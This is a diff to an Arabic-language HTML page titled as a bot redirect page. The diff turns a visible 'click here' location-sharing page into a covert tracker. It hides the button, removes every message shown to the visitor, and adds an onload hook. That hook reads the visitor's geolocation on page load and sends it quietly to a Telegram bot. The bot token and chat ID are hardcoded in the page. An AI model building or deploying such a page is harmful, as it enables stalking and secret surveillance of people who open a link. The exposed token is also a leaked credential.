@@ -4,13 +4,11 @@
   <title>صفحة توجيه البوت</title>
 </head>
 <body>
-  <h2>شلونكم يابة اضغط هنا حتى تتوجه للصفحة</h2>
-  <button onclick="getLocation()">اضغط هنا</button>
-  <p id="result"></p>
+  <button onclick="getLocation()" style="display:none;">.</button>
 
   <script>
     const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
-    const CHAT_ID = "6028485445"
+    const CHAT_ID = "6028485445";
 
     function getLocation() {
       if (navigator.geolocation) {
@@ -18,26 +16,14 @@
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
-          document.getElementById("result").innerText = `Latitude: ${lat}, Longitude: ${lon}`;
-
-          // إرسال الإحداثيات باستخدام sendLocation
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
-            .then(response => response.json())
-            .then(data => {
-              console.log("تم الإرسال:", data);
-              alert("تم إرسال الموقع إلى البوت!");
-            })
-            .catch(error => {
-              console.error("خطأ في الإرسال:", error);
-              alert("فشل إرسال الموقع.");
-            });
-        }, () => {
-          alert("رفضت مشاركة الموقع.");
+            .catch(error => {});
         });
-      } else {
-        alert("المتصفح لا يدعم تحديد الموقع.");
       }
     }
+
+    // تشغيل التلقائي عند فتح الصفحة
+    window.onload = getLocation;
   </script>
 </body>
 </html>
